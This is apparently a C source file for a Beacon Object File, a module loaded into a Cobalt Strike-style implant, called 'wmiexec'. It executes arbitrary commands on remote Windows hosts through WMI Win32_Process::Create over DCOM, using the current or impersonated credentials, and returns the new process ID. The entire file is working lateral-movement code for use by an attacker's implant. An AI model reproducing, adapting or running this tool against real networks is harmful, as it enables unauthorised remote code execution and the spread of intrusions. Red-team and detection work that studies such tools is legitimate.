/*
 * bof-wmiexec <host> <command>
 *
 * Remote execution through the WMI Win32_Process::Create method.  Uses the
 * current logon (impersonate first if you need other credentials).  Executes
 * in the caller's session on the target and returns the new PID.
 *
 * Requires DCOM/RPC to the target and WMI rights; use host "." for local.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static const GUID bof_clsid_wbemlocator =
    {0x4590f811, 0x1d3a, 0x11d0, {0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24}};
static const GUID bof_iid_iwbemlocator =
    {0xdc12a687, 0x737f, 0x11cf, {0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24}};

void go(char *args, int alen)
{
    datap parser;
    char *host, *command;
    int hlen, clen;
    wchar_t whost[256], wns[320], *wcmd;
    wchar_t wcmdbuf[2048];
    BSTR bns = NULL, bcls = NULL, bmeth = NULL, bcmd = NULL;
    IWbemLocator *loc = NULL;
    IWbemServices *svc = NULL;
    IWbemClassObject *cls = NULL, *inSig = NULL, *inInst = NULL, *outInst = NULL;
    COSERVERINFO si;
    COAUTHINFO ai;
    MULTI_QI qi;
    VARIANT v;
    HRESULT hr;
    int coinit = 0, remote;
    DWORD clsid_ctx;

    BeaconDataParse(&parser, args, alen);
    host    = BeaconDataExtract(&parser, &hlen);
    command = BeaconDataExtract(&parser, &clen);
    if (!host || !command || !command[0]) {
        BeaconPrintf(CALLBACK_ERROR, "usage: wmiexec <host|.> <command>\n");
        return;
    }
    if (!host[0]) host = ".";

    remote = !(bof_strcmp(host, ".") == 0 || bof_stricmp(host, "localhost") == 0);

    if (bof_a2w(command, wcmdbuf, 2048) <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "command too long\n");
        return;
    }
    wcmd = wcmdbuf;

    hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr)) coinit = 1;
    else if (hr != (HRESULT)0x80010106L) {
        BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx: 0x%08lx\n", (unsigned long)hr);
        return;
    }

    bof_memzero(&si, sizeof(si));
    bof_memzero(&ai, sizeof(ai));
    ai.dwAuthnSvc = RPC_C_AUTHN_WINNT;
    ai.dwAuthzSvc = RPC_C_AUTHZ_NONE;
    ai.dwAuthnLevel = RPC_C_AUTHN_LEVEL_PKT_PRIVACY;
    ai.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;

    if (remote) {
        if (bof_a2w(host, whost, 256) <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "host name too long\n");
            goto cleanup;
        }
        si.pwszName = whost;
        si.pAuthInfo = &ai;
        bof_wcscpy(wns, L"\\\\");
        bof_wcsncat(wns, whost, 300 - bof_wcslen(wns) - 1);
        bof_wcsncat(wns, L"\\ROOT\\CIMV2", 300 - bof_wcslen(wns) - 1);
        clsid_ctx = CLSCTX_REMOTE_SERVER;
    } else {
        bof_wcscpy(wns, L"ROOT\\CIMV2");
        clsid_ctx = CLSCTX_INPROC_SERVER;
    }

    qi.pIID = &bof_iid_iwbemlocator;
    qi.pItf = NULL;
    qi.hr = 0;
    hr = OLE32$CoCreateInstanceEx(&bof_clsid_wbemlocator, NULL, clsid_ctx,
                                  remote ? &si : NULL, 1, &qi);
    if (FAILED(hr) || !qi.pItf) {
        BeaconPrintf(CALLBACK_ERROR, "CoCreateInstanceEx(WbemLocator) on %s: 0x%08lx\n",
                     host, (unsigned long)(FAILED(hr) ? hr : qi.hr));
        goto cleanup;
    }
    loc = (IWbemLocator *)qi.pItf;

    bns = OLEAUT32$SysAllocString(wns);
    if (!bns) goto cleanup;

    hr = loc->lpVtbl->ConnectServer(loc, bns, NULL, NULL, NULL, 0, NULL, NULL, &svc);
    if (FAILED(hr) || !svc) {
        BeaconPrintf(CALLBACK_ERROR, "ConnectServer(%ls): 0x%08lx\n", wns,
                     (unsigned long)hr);
        goto cleanup;
    }

    OLE32$CoSetProxyBlanket((IUnknown *)svc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE,
                            NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                            RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0);

    bcls = OLEAUT32$SysAllocString(L"Win32_Process");
    bmeth = OLEAUT32$SysAllocString(L"Create");
    bcmd = OLEAUT32$SysAllocString(wcmd);
    if (!bcls || !bmeth || !bcmd) {
        BeaconPrintf(CALLBACK_ERROR, "SysAllocString failed\n");
        goto cleanup;
    }

    hr = svc->lpVtbl->GetObject(svc, bcls, 0, NULL, &cls, NULL);
    if (FAILED(hr) || !cls) {
        BeaconPrintf(CALLBACK_ERROR, "GetObject(Win32_Process): 0x%08lx\n",
                     (unsigned long)hr);
        goto cleanup;
    }

    hr = cls->lpVtbl->GetMethod(cls, bmeth, 0, &inSig, NULL);
    if (FAILED(hr) || !inSig) {
        BeaconPrintf(CALLBACK_ERROR, "GetMethod(Create): 0x%08lx\n", (unsigned long)hr);
        goto cleanup;
    }

    hr = inSig->lpVtbl->SpawnInstance(inSig, 0, &inInst);
    if (FAILED(hr) || !inInst) {
        BeaconPrintf(CALLBACK_ERROR, "SpawnInstance: 0x%08lx\n", (unsigned long)hr);
        goto cleanup;
    }

    OLEAUT32$VariantInit(&v);
    v.vt = VT_BSTR;
    v.bstrVal = bcmd;
    hr = inInst->lpVtbl->Put(inInst, L"CommandLine", 0, &v, 0);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Put(CommandLine): 0x%08lx\n", (unsigned long)hr);
        goto cleanup;
    }

    hr = svc->lpVtbl->ExecMethod(svc, bcls, bmeth, 0, NULL, inInst,
                                 &outInst, NULL);
    if (FAILED(hr) || !outInst) {
        BeaconPrintf(CALLBACK_ERROR, "ExecMethod(Create): 0x%08lx\n", (unsigned long)hr);
        goto cleanup;
    }

    {
        VARIANT rv, pid;
        OLEAUT32$VariantInit(&rv);
        OLEAUT32$VariantInit(&pid);
        if (SUCCEEDED(outInst->lpVtbl->Get(outInst, L"ReturnValue", 0, &rv, NULL, NULL)) &&
            rv.vt == VT_I4 && rv.lVal == 0) {
            if (SUCCEEDED(outInst->lpVtbl->Get(outInst, L"ProcessId", 0, &pid, NULL, NULL)) &&
                pid.vt == VT_I4)
                BeaconPrintf(CALLBACK_OUTPUT, "[+] %s -> PID %ld\n", host, (long)pid.lVal);
            else
                BeaconPrintf(CALLBACK_OUTPUT, "[+] %s -> created\n", host);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] Win32_Process.Create failed, ReturnValue=%ld\n",
                         (rv.vt == VT_I4) ? (long)rv.lVal : -1L);
        }
        OLEAUT32$VariantClear(&rv);
        OLEAUT32$VariantClear(&pid);
    }

cleanup:
    if (outInst) outInst->lpVtbl->Release(outInst);
    if (inInst)  inInst->lpVtbl->Release(inInst);
    if (inSig)   inSig->lpVtbl->Release(inSig);
    if (cls)     cls->lpVtbl->Release(cls);
    if (svc)     svc->lpVtbl->Release(svc);
    if (loc)     loc->lpVtbl->Release(loc);
    if (bcmd)  OLEAUT32$SysFreeString(bcmd);
    if (bmeth) OLEAUT32$SysFreeString(bmeth);
    if (bcls)  OLEAUT32$SysFreeString(bcls);
    if (bns)   OLEAUT32$SysFreeString(bns);
    if (coinit) OLE32$CoUninitialize();
}
